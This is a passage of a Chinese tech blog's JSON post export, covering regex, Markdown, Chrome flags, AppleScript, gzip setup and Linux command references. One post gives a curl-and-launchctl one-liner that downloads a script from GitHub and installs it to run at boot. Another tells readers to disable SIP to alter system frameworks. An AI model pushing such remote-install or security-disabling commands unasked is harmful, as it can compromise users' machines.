(xyz)匹配括号内的内容，并且使用此字符向后引用。 例子 表达式：([a-z])+ 文本：这杯water特别clear 匹配结果：waterclear [xyz]匹配字符范围。 例子 表达式：[a-z] 文本：Bluepeninmyhand. 匹配结果：luepeninmyhand [^xyz]不匹配字符范围 例子 表达式：[^a-z] 文本：May I have a coffee. 匹配结果：M I .(M空格I空格空格空格.) {x}重复x次 例子 表达式：o{2} 文本：It feels good to look at the moon. 匹配结果：oooooo {x,}重复x次或者大于x次 例子 表达式：0{2,} 文本：2000块的预算买电脑。 匹配结果：000 {x,y}重复x到y次 例子 表达式：0{2,3} 文本：一百=100，一千=1000，一万=10000 匹配结果：00000000 转义符 \\表示转义序列，或去掉元字符的转义。 例子 表达式：\\\\|\\^ 文本：KL\\bwo^K0c 匹配结果：\\^ 贪婪与非贪婪模式 通常情况下，在整个表达式能匹配到文本的前提下，尽可能匹配更多的字符。 例子 表达式：a.*c 文本：aabbcsdwosbabbc 匹配结果：aabbcsdwosbabbc 有时会需要非贪婪匹配，也就是匹配尽可能少的字符。限定符都可以变为非贪婪模式。 例子 表达式：a.*?c 文本：aabbcsdwosbabbc 匹配结果：aabbcabbc ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"正则表达式语法","feature":"https://dev-coco.github.io/post-images/Regex-Syntax.png","link":"https://dev-coco.github.io/post/Regex-Syntax/","stats":{"text":"4 min read","time":220000,"words":939,"minutes":4},"date":"2022-02-04 03:46:16","dateFormat":"2022-02-04"},{"content":"屏蔽 iOS 设备的 OTA 自动更新。 .notice{position:fixed;left:50%;top:50%;-webkit-transform:translate(-50%,-50%);z-index:9999;text-align:center;background-color:#fff;padding:12px;border-radius:10px} function mobile_device(){navigator.userAgent.match(/iPhone|iPod|iPad/i)?window.open(\"https://dev-coco.github.io/bota.mobileconfig\",\"_blank\"):document.getElementsByClassName(\"notice\")[0].setAttribute(\"style\",\"display:block\")}function close_notice(){document.getElementsByClassName(\"notice\")[0].setAttribute(\"style\",\"display:none\")} 当苹果发布了新版本的 iOS 系统时，设备只要联网就会在后台静默下载更新文件。一方面会占用设备的内存，另一方面容易误触而不小心了更新了系统。下面就介绍一个方法可以屏蔽 OTA 更新。 使用方法 屏蔽OTA更新 点击链接后会跳转到 Safari 下载一个描述文件，点击允许。 下载完成后点击关闭按钮。 点开设置，找到已下载描述文件。 点击安装。 然后会提示需要输入锁屏密码。 输入完成后再次点安装。 如果安装后提示需要重启设备，那么就点重新启动，如果没有提示就忽略此步骤。 安装完成后在软件更新里面就会显示当前的系统为最新系统，不会收到新系统的推送了。 安装完配置文件后设备上会出现一个 Feedback 软件，这个是系统隐藏的软件，属于正常情况。 详细操作请看下面的动态图。 使用相机扫描二维码打开链接 ","tags":[{"name":"iOS","slug":"ios","used":true,"link":"https://dev-coco.github.io/tag/ios/"}],"title":"屏蔽 OTA 更新","feature":"https://dev-coco.github.io/post-images/Block-OTA-Update.png","link":"https://dev-coco.github.io/post/Block-OTA-Update/","stats":{"text":"2 min read","time":85000,"words":364,"minutes":2},"date":"2022-02-04 03:25:32","dateFormat":"2022-02-04"},{"content":"关于提高浏览器性能的选项设置。 Chrome 浏览器有一些隐藏的设置选项，因为是测试功能，所以没有在设置界面显示出来，下面将会介绍几个关于提高浏览器性能的选项设置。 在浏览器的网址处输入：chrome://flags Parallel downloading 浏览器默认是单线程下载的，开启这项功能后浏览器支持多线程下载，加快文件下载的速度。 Experimental QUIC protocol 开启 QUIC (Quick UDP Internet Connection 快速UDP连接) 协议，减少延迟时间，改进堵塞控制。 GPU rasterization Chrome 不会太依赖 GPU 来处理图像数据，所以可以开启这项功能将 CPU 处理切换到 GPU 来加快处理图像数据。 Zero-copy rasterizer 开启后会把光栅化写入 GPU 内存，因为这样速度会被常规的 RAM 速度更快。 Destroy Profile on browser close Chrome 浏览器默认会在完全关闭浏览器后再释放内存和其他的资源，开启这项功能后，关闭浏览器人员，即使没有完全关闭所有的浏览器，就会释放内存和其他的资源。 Override software rendering list Chrome 会禁用某些版本的 GPU 加速网页，可能会导致浏览器运行缓慢，开启这项功能后，浏览器会强制使用 GPU 加速，即使被禁用。设置完成后可以在 chrome://gpu 查看开启的状态。 ⚠️ 注意！开启 GPU 相关功能加快渲染速度的同时，可能会增加设备温度和耗电量，有利也有弊。是否开启取决于是更偏向于性能，还是更偏向于设备的续航时间，当然如果设备过热的时候也会降低 CPU 的频率。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"浏览器提高性能设置","feature":"https://dev-coco.github.io/post-images/Chrome-Performance-Settings.png","link":"https://dev-coco.github.io/post/Chrome-Performance-Settings/","stats":{"text":"2 min read","time":97000,"words":450,"minutes":2},"date":"2022-02-04 02:49:02","dateFormat":"2022-02-04"},{"content":"最近在使用 Google Excel 的时候发现了一个问题，表格里面的链接不知道是什么原因不会自带超链接。 不过后来写了一个 AppleScript 解决了这个问题，点击下载。 源码如下： set RepeatTimes to display dialog &quot;请输入数量&quot; default answer &quot;&quot; with title &quot;Excel Hyperlink&quot; buttons {&quot;关闭&quot;, &quot;继续&quot;} default button &quot;继续&quot; set DoubleRepeatTimes to (text returned of RepeatTimes) * 2 tell application &quot;System Events&quot; delay 3 repeat DoubleRepeatTimes times -- delay 0.08 key code 36 end repeat end tell 使用方法 输入需要换上超链接的数量（要在同一列），选中第一个单元格，等待 3 秒后就会开始运行。如果电脑配置不高可以设置延时，不过在运行的过程中只能等待，其他什么也做不了。 效果 ","tags":[{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google Excel 超链接","feature":"https://dev-coco.github.io/post-images/Google-Excel-Hyperlink.png","link":"https://dev-coco.github.io/post/Google-Excel-Hyperlink/","stats":{"text":"1 min read","time":51000,"words":206,"minutes":1},"date":"2022-02-04 02:11:44","dateFormat":"2022-02-04"},{"content":"Markdown 基本语法。 换行 在 Markdown 的语法里面换行的话使用 &lt;Enter&gt; 键就可以了，如果是一个新的段落，那就使用两个 &lt;Enter&gt;。下面来看一下效果。 Markdown 语法 效果 这是一句很长很长的一句话但是我想在下面再加一段话就像这样子，这样就是第二段话啦。 这是一句很长很长的一句话 但是我想在下面再加一段话就像这样子，这样就是第二段话啦。 标题 标题 在 # 符号后面加一个空格再加上文字。几个 # 符号就代表几级标题。 Markdown 语法 效果 # 一级标题 一级标题 ## 二级标题 二级标题 ### 三级标题 三级标题 #### 四级标题 四级标题 ##### 五级标题 五级标题 ###### 六级标题 六级标题 字体 加粗：需要加粗的文字左右两边分别放两个符号。 斜体：需要倾斜的文字左右两边分别放一个符号。 倾斜加粗：需要倾斜加粗的文字左右两边分别放三个*符号。 删除线：需要加删除线的文字左右两边分别放两个~符号。 Markdown 语法 效果 普通文本 普通文本 **加粗** 加粗 *斜体* 斜体 ***倾斜加粗*** 倾斜加粗 ~~删除线~~ 删除线 分割线 三个或三个以上的 - 或 * 符号。 Markdown 语法 效果 --- *** 图片 图片![图片alt标签](图片链接)，效果就像下图这样。 超链接 [文本](链接)，例如[Mac清理垃圾](https://dev-coco.github.io/post/Mac-Cleaner/)，效果就像这样：Mac清理垃圾 代码块 在开头和结尾用三个`符号单独占一行。 ``` #include &lt;stdio.h&gt; int main() { printf(&quot;Hello, World!&quot;); return 0; } ``` 效果 #include &lt;stdio.h&gt; int main() { printf(&quot;Hello, World!&quot;); return 0; } 关于 YouTube 在 Markdown 里是不可以直接插入 YouTube 视频的，但是可以使用另外一种方法，就是使用 YouTube 视频的缩略图做超链接。 [![图片标签](https://img.youtube.com/vi/视频ID地址/0.jpg)](https://www.youtube.com/watch?v=视频ID地址) ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"Markdown 语法","feature":"https://dev-coco.github.io/post-images/Markdown-Syntax.png","link":"https://dev-coco.github.io/post/Markdown-Syntax/","stats":{"text":"2 min read","time":119000,"words":536,"minutes":2},"date":"2022-02-04 01:49:49","dateFormat":"2022-02-04"},{"content":"自动更新 macOS 上的软件。 在使用之前你可能会需要查看在 Github 上的源代码。 在 Terminal 运行下面的命令，运行完成后需要重启设备。这个脚本会在系统启动的时候检测软件的版本，如果是旧版本会自动更新。 安装命令 cd /Users/$USER/Library/LaunchAgents &amp;&amp; curl https://raw.githubusercontent.com/dev-coco/AutomaticSoftwareUpdate/master/AutomaticSoftwareUpdate.sh -o AutomaticSoftwareUpdate.sh &amp;&amp; sudo chmod +x /Users/$USER/Library/LaunchAgents/AutomaticSoftwareUpdate.sh &amp;&amp; curl https://raw.githubusercontent.com/dev-coco/AutomaticSoftwareUpdate/master/com.dev-coco.AutoUpdate.plist -o com.dev-coco.AutoUpdate.plist &amp;&amp; defaults write /Users/$USER/Library/LaunchAgents/com.dev-coco.AutoUpdate.plist Program -string &quot;/Users/$USER/Library/LaunchAgents/AutomaticSoftwareUpdate.sh&quot; &amp;&amp; defaults write /Users/$USER/Library/LaunchAgents/com.dev-coco.AutoUpdate.plist ProgramArguments -array -string &quot;/Users/$USER/Library/LaunchAgents/AutomaticSoftwareUpdate.sh&quot; &amp;&amp; launchctl load -w /Users/$USER/Library/LaunchAgents/com.dev-coco.AutoUpdate.plist &amp;&amp; killall -9 Terminal 卸载命令 launchctl unload -w /Users/$USER/Library/LaunchAgents/com.dev-coco.AutoUpdate.plist &amp;&amp; sudo rm -rf /Users/$USER/Library/LaunchAgents/AutomaticSoftwareUpdate.sh &amp;&amp; sudo rm -rf /Users/$USER/Library/LaunchAgents/com.dev-coco.AutoUpdate.plist 检测Chrome版本 /Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --version 检测命令 launchctl list | grep dev-coco.AutoUpdate 如果有输出内容就说明安装成功，进程已经在运行了。如果未显示任何内容代表没有安装成功。详情请看下图： ","tags":[{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"macOS 软件自动更新","feature":"https://dev-coco.github.io/post-images/Automatic-Software-Update.png","link":"https://dev-coco.github.io/post/Automatic-Software-Update/","stats":{"text":"2 min read","time":93000,"words":314,"minutes":2},"date":"2022-02-03 23:21:08","dateFormat":"2022-02-03"},{"content":"降低背景的噪音。 使用说明 此软件和真正意义上的降噪不一样，不会生成反向声波和噪音中和，但是可以大幅降低背景的噪音。 注意事项：请勿在设置立体音的情况下使用此软件，否则声音可能会很小或者听不见。 使用方法 点击程序即可运行，运行后会在 Dock 栏显示。图标下面有个小点说明是在运行状态。 如果要关闭，需要打开活动监视器，找到 FNC 进程强制结束。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"伪降噪","feature":"https://dev-coco.github.io/post-images/Fake-Noise-Cancellation.png","link":"https://dev-coco.github.io/post/Fake-Noise-Cancellation/","stats":{"text":"1 min read","time":29000,"words":147,"minutes":1},"date":"2022-02-03 22:23:48","dateFormat":"2022-02-03"},{"content":"加快用户加载网页的速度一些优化方案。 Gzip 压缩 Gzip 压缩是基于服务端的一种网页压缩的功能，Gzip 压缩可以对网页里的 (HTML, CSS, JS 等) 进行压缩，减少网页文件的大小，这样可以加快网页打开的速度。让我们先来看看浏览器是如何加载网页的。 如何开启 Gzip 压缩 通过.htaccess 文件开启压缩 &lt;ifModule mod_gzip.c&gt; mod_gzip_on Yes mod_gzip_dechunk Yes mod_gzip_item_include file .(html?|txt|css|js|php|pl)$ mod_gzip_item_include handler ^cgi-script$ mod_gzip_item_include mime ^text/.* mod_gzip_item_include mime ^application/x-javascript.* mod_gzip_item_exclude mime ^image/.* mod_gzip_item_exclude rspheader ^Content-Encoding:.*gzip.* &lt;/ifModule&gt; 在 Apache 服务器通过 htaccess 开启 Gzip 压缩 &lt;IfModule mod_deflate.c&gt; AddOutputFilterByType DEFLATE application/javascript AddOutputFilterByType DEFLATE application/rss+xml AddOutputFilterByType DEFLATE application/vnd.ms-fontobject AddOutputFilterByType DEFLATE application/x-font AddOutputFilterByType DEFLATE application/x-font-opentype AddOutputFilterByType DEFLATE application/x-font-otf AddOutputFilterByType DEFLATE application/x-font-truetype AddOutputFilterByType DEFLATE application/x-font-ttf AddOutputFilterByType DEFLATE application/x-javascript AddOutputFilterByType DEFLATE application/xhtml+xml AddOutputFilterByType DEFLATE application/xml AddOutputFilterByType DEFLATE font/opentype AddOutputFilterByType DEFLATE font/otf AddOutputFilterByType DEFLATE font/ttf AddOutputFilterByType DEFLATE image/svg+xml AddOutputFilterByType DEFLATE image/x-icon AddOutputFilterByType DEFLATE text/css AddOutputFilterByType DEFLATE text/html AddOutputFilterByType DEFLATE text/javascript AddOutputFilterByType DEFLATE text/plain AddOutputFilterByType DEFLATE text/xml BrowserMatch ^Mozilla/4 gzip-only-text/html BrowserMatch ^Mozilla/4\\.0[678] no-gzip BrowserMatch \\bMSIE !no-gzip !gzip-only-text/html Header append Vary User-Agent &lt;/IfModule&gt; 在 Nginx 服务器开启 Gzip 压缩 gzip on; gzip_comp_level 2; gzip_http_version 1.0; gzip_proxied any; gzip_min_length 1100; gzip_buffers 16 8k; gzip_types text/plain text/html text/css application/x-javascript text/xml application/xml application/xml+rss text/javascript; gzip_disable &quot;MSIE [1-6].(?!.*SV1)&quot;; gzip_vary on; 设置成功后可以使用 测试工具 来测试是否成功开启了 Gzip。 优化代码 压缩 CSS，JS，HTML 在 HTML, CSS, JS 这些文件里面都会有一些空格，注释，换行等等，可以将这些代码给压缩成一行。这样可以大大的减小文件的体积，加快加载的速度。 代码顺序 因为加载网页的时候，正常是从上到下加载的。把 CSS 代码放在最前，加载出网页的页面，把 JS 的代码放在 body 的下面，放到最后加载。 图片格式和大小 常用的图片有这几种 webp, jpeg, png 格式，其中 webp 格式的图片体积最小，但是兼容性不是太好，有的浏览器不支持 webp 格式的图片。jpeg 的图片是目前比较主流的图片格式之一，图片体积要比 png 小，但是不支持图片的透明背景。png 格式的图片支持背景透明，防锯齿。 在一个网页里面可能会包含多张图片，可以将图片的尺寸修改到刚好合适的尺寸即可，这样就不需要用一个大尺寸的图片再使用 CSS 进行适配。还可以将图片进行压缩，图片的在保证用户体验的同时尽可能的压缩图片，图片体积越小，加载速度越快。如果是非常小的图片，建议使用 base64 压缩，避免网络请求，加载速度更快。 CDN CDN 是内容分发网络，可以将网页的内容更快的传输给用户。就好比一个日本的服务器，在美国的用户打开速度就比较慢，没有日本当地打开的快。那么使用 CDN 的话，只要在美国地区有节点就会大大提高访问的速度。CDN 原理是将服务器的网页存在各个国家各个地区的节点，当用户请求网页的时候，就会访问距离用户最近的节点，这样就可以提高网页的加载速度。可以考虑选用 Cloudflare。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"优化加载网页速度","feature":"https://dev-coco.github.io/post-images/Website-Loading-Optimization.png","link":"https://dev-coco.github.io/post/Website-Loading-Optimization/","stats":{"text":"4 min read","time":223000,"words":894,"minutes":4},"date":"2022-02-03 21:30:15","dateFormat":"2022-02-03"},{"content":"macOS 无法切换输入法这个问题困扰我很久了，似乎是个通病。不过后来终于找到了问题所在。 macOS 自带的 Tcl 和 TK 框架有严重错误，会导致奔溃，所以有时候输入法就无法切换了，替换一下这个框架就可以解决这个问题了。 解决方法 在 ActiveTcl 下载 8.5 版本，然后安装。 在操作前需要暂时关闭 SIP 保护。在设备开机的时候按 Command (⌘) + R 进入恢复模式，然后执行 SIP 相关命令。 关闭SIP csrutil disable 开启SIP csrutil enable 关闭 SIP 保护后，在 /Library/Frameworks 目录下，把 Tk.framework 和 Tcl.framework 这两个文件复制到 /System/Library/Frameworks 目录下。然后重启电脑，开启 SIP 保护。 最后把 tclvfse 软件卸载掉即可。 ","tags":[{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"macOS 无法切换输入法","feature":"https://dev-coco.github.io/post-images/Fix-Mac-IME-Switch.png","link":"https://dev-coco.github.io/post/Fix-Mac-IME-Switch/","stats":{"text":"1 min read","time":46000,"words":207,"minutes":1},"date":"2022-02-03 20:02:36","dateFormat":"2022-02-03"},{"content":"每天要在 Skype 准时发送消息，有没有什么方法可以让设备自动去执行定时发布消息呢？ 大概思路： 打开 Skype 指定用户的对话界面。 发送指定内容。 定时发送。 在微软的官网上查到一个关于 Skype URI API 的介绍。简单的看了一下，使用以下方法调用 Skype 打开指定用户的对话界面。代码如下： skype:用户ID?chat 接下来要解决的是发送指定内容的问题。这里我打算使用 AppleScript + Shell 来实现这个功能。 大概思路：复制指定内容到剪切板，打开 Skype 指定用户对话框，粘贴，发送。在 Mac 中 pbcopy 命令负责将内容复制到剪切板。 echo &quot;自定义内容&quot; | pbcopy 不过在 AppleScript 需要调用 Terminal 来运行，将内容复制到剪切板后再关闭 Terminal。 tell application &quot;Terminal&quot; do script &quot;echo \\&quot;自定义内容\\&quot; | pbcopy&quot; do script &quot;killall Terminal&quot; end tell 这里解释一下 \\&quot;，因为在 AppleScript 中 do script 已经使用了&quot;，那么在引号里面使用引号需要使用转义字符。然后再打开指定用户的对话界面，使用 open 命令来打开链接，然后就会跳转到 Skype 应用程序内了。 do shell script &quot;skype:用户ID?chat&quot; do shell script 和 do script 有些不同，do shell script 不需要调用 Terminal 即可运行，但是 do script 就需要调用 Terminal 后运行，这里就不过多细说了。最后再使用 keystroke 模拟键盘操作粘贴和回车键。这里需要调用 System Events，然后使用 keystroke &quot;v&quot; using command down，模拟 Command + V 操作，最后使用 key code 36 模拟回车键操作。代码如下： tell application &quot;System Events&quot; delay 0.3 keystroke &quot;v&quot; using command down delay 0.3 key code 36 end tell 这里解释一下 delay，需要设置延时，如果操作太快，界面还没跳转过来，就进行下面的操作，这样整个流程就会出现问题。 最后要解决定时发送的问题。可以做一个守护进程，设置好时间，然后用 launchctl 启用即可。 &lt;key&gt;StartCalendarInterval&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Minute&lt;/key&gt; &lt;integer&gt;分钟&lt;/integer&gt; &lt;key&gt;Hour&lt;/key&gt; &lt;integer&gt;小时&lt;/integer&gt; &lt;/dict&gt; 这里有个地方需要注意一下，需要调用 AppleScript 输出程序的路径，如果单单调用 AppleScript 是无法直接使用的，需要把 AppleScript 输出为应用程序后再使用。完整代码 --&gt; Github。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"Skype 自动发送消息","feature":"https://dev-coco.github.io/post-images/Skype-Schedule-Messages.png","link":"https://dev-coco.github.io/post/Skype-Schedule-Messages/","stats":{"text":"3 min read","time":158000,"words":656,"minutes":3},"date":"2022-02-03 19:15:19","dateFormat":"2022-02-03"},{"content":"用于显示开机信息。 kernel 会将开机信息存储在 ring buffer 中。您若是开机时来不及查看信息，可利用 dmesg 来查看。开机信息亦保存在 /var/log 目录中，名称为 dmesg 的文件里。 语法 dmesg [-cn][-s &lt;缓冲区大小&gt;] 参数说明： -c 显示信息后，清除 ring buffer 中的内容。 -s&lt;缓冲区大小&gt; 预设置为 8196，刚好等于 ring buffer 的大小。 -n 设置记录信息的层级。 实例 显示开机信息 # dmesg |less WARNING: terminal is not fully functional [ 0.000000] Initializing cgroup subsys cpuset [ 0.000000] Initializing cgroup subsys cpu [ 0.000000] Linux version 2.6.32-21-generic (buildd@rothera) (gcc version 4.4.3 (Ub untu 4.4.3-4ubuntu5) ) #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 (Ubuntu 2.6.32-21.3 2-generic 2.6.32.11+drm33.2) [ 0.000000] KERNEL supported cpus: [ 0.000000] Intel GenuineIntel [ 0.000000] AMD AuthenticAMD [ 0.000000] NSC Geode by NSC [ 0.000000] Cyrix CyrixInstead [ 0.000000] Centaur CentaurHauls [ 0.000000] Transmeta GenuineTMx86 [ 0.000000] Transmeta TransmetaCPU [ 0.000000] UMC UMC UMC UMC [ 0.000000] BIOS-provided physical RAM map: [ 0.000000] BIOS-e820: 0000000000000000 - 000000000009f800 (usable) [ 0.000000] BIOS-e820: 000000000009f800 - 00000000000a0000 (reserved) [ 0.000000] BIOS-e820: 00000000000ca000 - 00000000000cc000 (reserved) [ 0.000000] BIOS-e820: 00000000000dc000 - 00000000000e0000 (reserved) [ 0.000000] BIOS-e820: 00000000000e4000 - 0000000000100000 (reserved) [ 0.000000] BIOS-e820: 0000000000100000 - 000000003fef0000 (usable) [ 0.000000] BIOS-e820: 000000003fef0000 - 000000003feff000 (ACPI data) [ 0.000000] BIOS-e820: 000000003feff000 - 000000003ff00000 (ACPI NVS) ……省略部分内容 显示开机信息 #pwd //查看当前所在目录 /home/hnlinux/ # dmesg &gt; boot.msg //将开机信息保存到 boot.msg文件中 #ls //显示当前目录文件 boot.msg ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dmesg","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dmesg/","stats":{"text":"2 min read","time":107000,"words":356,"minutes":2},"date":"2022-02-03 15:20:43","dateFormat":"2022-02-03"},{"content":"默认目录的安全上下文查询与修改。 补充说明 semanage 命令是用来查询与修改 SELinux 默认目录的安全上下文。SELinux 的策略与规则管理相关命令：seinfo 命令、sesearch 命令、getsebool 命令、setsebool 命令、semanage 命令。 语法 semanage {login|user|port|interface|fcontext|translation} -l semanage fcontext -{a|d|m} [-frst] file_spec 选项 -l：查询。 fcontext：主要用在安全上下文方面。 -a：增加，你可以增加一些目录的默认安全上下文类型设置。 -m：修改。 -d：删除。 实例 查询一下/var/www/html的默认安全性本文的设置： semanage fcontext -l SELinux fcontext type Context ....(前面省略).... /var/www(/.*)? all files system_u:object_r:httpd_sys_content_t:s0 ....(後面省略).... 如上面例子所示，我们可以查询的到每个目录的安全性本文！而目录的设定可以使用正则表达式去指定一个范围。那么如果我们想要增加某些自定义目录的安全性本文呢？举例来说，我想要色设置/srv/samba成为 public_content_t的类型时，应该如何设置呢？ 用 semanage 命令设置/srv/samba目录的默认安全性本文为public_content_t： mkdir /srv/samba ll -Zd /srv/samba drwxr-xr-x root root root:object_r:var_t /srv/samba 如上所示，默认的情况应该是var_t这个咚咚的！ semanage fcontext -l | grep '/srv' /srv/.* all files system_u:object_r:var_t:s0 /srv/([^/]*/)?ftp(/.*)? all files system_u:object_r:public_content_t:s0 /srv/([^/]*/)?www(/.*)? all files system_u:object_r:httpd_sys_content_t:s0 /srv/([^/]*/)?rsync(/.*)? all files system_u:object_r:public_content_t:s0 /srv/gallery2(/.*)? all files system_u:object_r:httpd_sys_content_t:s0 /srv directory system_u:object_r:var_t:s0 //看这里！ 上面则是默认的/srv底下的安全性本文资料，不过，并没有指定到/srv/samba。 semanage fcontext -a -t public_content_t &quot;/srv/samba(/.*)?&quot; semanage fcontext -l | grep '/srv/samba' /srv/samba(/.*)? all files system_u:object_r:public_content_t:s0 cat /etc/selinux/targeted/contexts/files/file_contexts.local # This file is auto-generated by libsemanage # Please use the semanage command to make changes /srv/samba(/.*)? system_u:object_r:public_content_t:s0 #写入这个档案 restorecon -Rv /srv/samba* #尝试恢复默认值 ll -Zd /srv/samba drwxr-xr-x root root system_u:object_r:public_content_t /srv/samba/ #有默认值，以后用 restorecon 命令来修改比较简单！ semanage 命令的功能很多，这里主要用到的仅有 fcontext 这个选项的用法而已。如上所示，你可以使用 semanage 来查询所有的目录默认值，也能够使用它来增加默认值的设置！ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"semanage","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/semanage/","stats":{"text":"3 min read","time":148000,"words":571,"minutes":3},"date":"2022-02-03 15:19:57","dateFormat":"2022-02-03"},{"content":"POSIX 平台开发具有高压缩率的工具。 补充说明 xz 命令 XZ Utils 是为 POSIX 平台开发具有高压缩率的工具。它使用 LZMA2 压缩算法，生成的压缩文件比 POSIX 平台传统使用的 gzip、bzip2 生成的压缩文件更小，而且解压缩速度也很快。最初 XZ Utils 的是基于 LZMA-SDK 开发，但是 LZMA-SDK 包含了一些 WINDOWS 平台的特性，所以 XZ Utils 为以适应 POSIX 平台作了大幅的修改。XZ Utils 的出现也是为了取代 POSIX 系统中旧的 LZMA Utils。 语法 xz (选项) (参数) xz [OPTION]... [FILE]... 选项 -z, --compress # 强制压缩 -d, --decompress, --uncompress # force decompression -t, --test # 测试压缩文件的完整性 -l, --list # 列出有关.xz 文件的信息 -k, --keep # 保留（不要删除）输入文件 -f, --force # 强制覆盖输出文件和（解）压缩链接 -c, --stdout, --to-stdout # 写入标准输出，不要删除输入文件 -0 ... -9 # 压缩预设; 默认为 6; 取压缩机*和* # 使用 7-9 之前解压缩内存使用量考虑在内！ -e, --extreme # 尝试通过使用更多的 CPU 时间来提高压缩比; # 要求不影响解压缩存储器 -T, --threads=NUM # 最多使用 NUM 个线程; 默认值为 1; set to 0 # 设置为 0，使用与处理器内核一样多的线程 -q, --quiet # 抑制警告; 指定两次以抑制错误 -v, --verbose # 冗长; 指定两次更详细 -h, --help # 显示这个简洁的帮助并退出 -H, --long-help # 显示更多帮助（还列出了高级选项） -V, --version # 显示版本号并退出 参数 源文件：指定连接的源文件。 目标文件：指定源文件的目标连接文件。 实例 压缩一个文件 test.txt，压缩成功后生成 test.txt.xz, 原文件会被删除。 $ xz test.txt $ ls test.txt* test.txt.xz 解压 test.txt.xz 文件，并使用参数 -k 保持原文件不被删除 $ xz -d -k test.txt.xz $ ls test.txt* test.txt.xz test.txt 使用参数 -l 显示 .xz 文件的基本信息。基本信息包括压缩率、数据完整性验证方式等。也可以和参数 -v 或 -vv 配合显示更详尽的信息。 xz -l index.txt.xz # Strms Blocks Compressed Uncompressed Ratio Check Filename # 1 1 768 B 1,240 B 0.619 CRC64 index.txt. 使用参数 -0, -1, -2, … -6, … -9 或参数 --fast, --best 设定压缩率。xz 命令的默认为 -6 ，对于大多数系统来说，甚至是一些较旧的系统，-4 … -6 压缩率预设值都不错的表现。 $ xz -k7 xz_pipe_decomp_mini.c $ xz -k --fast xz_pipe_decomp_mini.c 使用参数 -H 显示 xz 命令所有 options. 参数 -H 比使用参数 --help 显示的内容更详细。 $ xz -H | more 借助 xargs 命令并行压缩多文件。下面的命令行可以将 /var/log 目录下所有的扩展名为 .log 的文件压缩。通过 xargs 命令同时运行多个 xz 进行压缩。 # 运行此命令须有 root 权限。 find /var/log -type f -iname &quot;*.log&quot; -print0 | xargs -P4 -n16 xz -T1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xz","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xz/","stats":{"text":"4 min read","time":186000,"words":769,"minutes":4},"date":"2022-02-03 15:19:44","dateFormat":"2022-02-03"},{"content":"标记 shell 变量或函数为只读。 语法 readonly [-aAf] [name[=value] ...] readonly -p 主要用途 定义一到多个变量并设置只读属性。 为已定义的一到多个变量设置只读属性。 显示全部包含只读属性的变量。 为已定义的一到多个函数设置只读属性。 显示全部包含只读属性的函数。 选项 -a：指向数组。 -A：指向关联数组。 -f：指向函数。 -p：显示全部只读变量。 --：在它之后的选项无效。 参数 name（可选）：变量名或函数名 value（可选）：变量的值 返回值 readonly 返回 true 除非你提供了非法选项或非法名称。 例子 # 定义变量并增加只读属性 readonly var1=13 var2 readonly -a arr1=(1 2 3 4 5) arr2=('z' 'x' 'c') # 必须有 '-A' 选项 readonly -A dict1=(['key1']='value1') # 先定义变量、函数，然后再为它们添加只读属性 max=3 readonly max # 数组定义时可以不加 `declare -a` seasons=('spring' 'summer' 'autumn' 'winter') # 为数组添加只读属性时可以不加 `-a` 选项 readonly seasons declare -A man=(['age']=23 ['height']='190cm') # 为关联数组添加只读属性时可以不加 `-A` 选项 readonly man function foo(){ echo 'bar'; } # 为函数添加只读属性时必须加 `-f` 选项 readonly -f foo # 显示全部只读变量，以下两个命令的显示结果一样 readonly readonly -p # 显示全部拥有只读属性的数组 readonly -a # 显示全部拥有只读属性的关联数组 readonly -A # 显示全部拥有只读属性的函数 readonly -f 常见错误 对于只读变量而言，若用户对其值进行修改，则会立即报错。例如，使用该指令定义一个只读变量&quot;test&quot;，并且将其值初始化为&quot;ok&quot;，输入如下命令： [root@localhost ~]# readonly test='ok' #定义只读变量并初始化 那么当用户直接修改该只读变量时就会报错，如下所示： [root@localhost ~]# test='my' #试图修改只读变量的值 -bash: test: readonly variable 当用户试图修改只读变量的值时，会被提示该变量为只读变量。 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 declare +r不能去除只读属性， unset不能删除只读变量。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"readonly","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/readonly/","stats":{"text":"3 min read","time":134000,"words":585,"minutes":3},"date":"2022-02-03 15:18:55","dateFormat":"2022-02-03"},{"content":"将字符进行替换压缩和删除。 补充说明 tr 命令可以对来自标准输入的字符进行替换、压缩和删除。它可以将一组字符变成另一组字符，经常用来编写优美的单行命令，作用很强大。 语法 tr (选项) (参数) 选项 -c 或——complerment：取代所有不属于第一字符集的字符； -d 或——delete：删除所有属于第一字符集的字符； -s 或--squeeze-repeats：把连续重复的字符以单独一个字符表示； -t 